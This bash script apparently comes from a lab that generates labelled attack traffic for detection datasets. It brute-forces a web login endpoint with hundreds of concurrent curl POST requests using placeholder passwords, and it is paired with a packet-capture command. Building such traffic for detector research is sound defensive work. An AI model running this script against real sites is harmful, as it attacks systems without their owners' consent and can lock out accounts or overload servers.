#!/usr/bin/env bash
# lab/attacks/web-brute.sh — web login brute force.  Label: Brute Force -Web
# RUN FROM THE ATTACKER HOST. Pair with:
#   sudo bash lab/capture.sh --label "Brute Force -Web" --duration 120 --attacker-ip <this host>
set -euo pipefail
TARGET="${1:?usage: web-brute.sh <https://host> [count]}"
COUNT="${2:-400}"
echo "brute-forcing $TARGET/api/v1/auth/login x$COUNT (20 concurrent)..."
for i in $(seq 1 "$COUNT"); do
  curl -s -o /dev/null --max-time 5 \
    -d "username=admin@example.com&password=wrong$i" \
    "$TARGET/api/v1/auth/login" &
  if (( i % 20 == 0 )); then wait; fi
done
wait
echo "done."
